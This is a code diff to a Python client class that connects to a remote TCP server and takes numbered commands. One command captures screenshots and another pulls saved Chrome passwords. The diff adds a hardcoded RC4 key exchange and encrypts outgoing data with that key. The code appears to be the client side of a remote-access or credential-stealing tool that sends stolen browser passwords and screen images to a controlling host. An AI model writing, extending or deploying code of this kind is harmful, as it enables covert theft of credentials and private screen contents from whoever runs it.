@@ -30,6 +30,7 @@ class Client:
 
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((TCP_IP, TCP_PORT))
+        self.sendRC4Key()
 
     def run(self):
 
@@ -39,10 +40,7 @@ class Client:
             pkt = Packet()
             pkt.construct(self.s)
             if pkt.state:
-                if pkt.state == "100":
-                    # threading.Thread
-                    pass
-                elif pkt.state == "143":
+                if pkt.state == "143":
                     threading.Thread(target=self.screenshot,args=[pkt]).start()
                 elif pkt.state == "144":
                     threading.Thread(target=self.passwords,args=[pkt]).start()
@@ -102,9 +100,6 @@ class Client:
     def decrypt(self,pkt):
         if pkt.data != "":
             decrypt(pkt.data)
-            # pkt.data = "decrypted"
-            # pkt.length = len(pkt.data)
-            # self.enqueue(pkt)
 
     def passwords(self,pkt):
         message = passwords.getChromePasswords()
@@ -119,9 +114,18 @@ class Client:
         self.enqueue(pkt)
 
     def encryptData(self,pkt):
-        key = "0102030405"
+        key = '\x01\x02\x03\x04\x05'
         cipher = ARC4.new(key)
         pkt.data = cipher.encrypt(pkt.data)
+
+    def sendRC4Key(self):
+        key = '\x01\x02\x03\x04\x05'
+        pkt = Packet()
+        pkt.state = '100'
+        pkt.toIP = ''
+        pkt.returnIP = 'MRS'
+        pkt.length = len(key)
+        pkt.data = key
 
     def enqueue(self,pkt):
         self.encryptData(pkt)
